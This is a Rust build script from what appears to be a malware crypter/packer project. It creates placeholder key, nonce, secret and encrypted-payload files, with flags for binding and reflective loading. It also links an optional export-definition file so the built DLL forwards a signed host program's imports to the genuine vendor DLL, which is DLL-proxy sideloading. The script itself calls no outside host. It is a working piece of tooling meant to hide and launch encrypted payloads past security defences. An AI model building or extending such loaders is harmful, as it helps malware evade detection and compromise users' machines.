//! Ensure the packer-generated files exist so a fresh clone builds before
//! packing. `crypter-packer` overwrites them with real key/nonce/blob.

use std::path::PathBuf;

const PLACEHOLDER_GEN: &str = r#"// generated by crypter-packer — do not edit
pub const KEY: [u8; 32] = [0u8; 32];
pub const NONCE: [u8; 24] = [0u8; 24];
pub const SECRET: [u8; 32] = [0u8; 32];
pub const BIND: bool = false;
pub const REFLECTIVE: bool = false;
pub const BLOB: &[u8] = include_bytes!("payload.enc");
"#;

fn main() {
    let manifest = PathBuf::from(std::env::var("CARGO_MANIFEST_DIR").expect("manifest"));
    let gen = manifest.join("src/gen.rs");
    let blob = manifest.join("src/payload.enc");
    if !gen.exists() {
        let _ = std::fs::write(&gen, PLACEHOLDER_GEN);
    }
    if !blob.exists() {
        let _ = std::fs::write(&blob, b"");
    }
    println!("cargo:rerun-if-changed={}", gen.display());
    println!("cargo:rerun-if-changed={}", blob.display());

    // Optional proxy export list: when `proxy.def` exists, link it so the DLL
    // can forward the signed host's imports to the real vendor DLL.
    let def = manifest.join("proxy.def");
    if def.exists() {
        println!("cargo:rerun-if-changed={}", def.display());
        let env = std::env::var("CARGO_CFG_TARGET_ENV").unwrap_or_default();
        if env == "msvc" {
            println!("cargo:rustc-link-arg=/DEF:{}", def.display());
        } else {
            println!("cargo:rustc-link-arg={}", def.display());
        }
    }
}
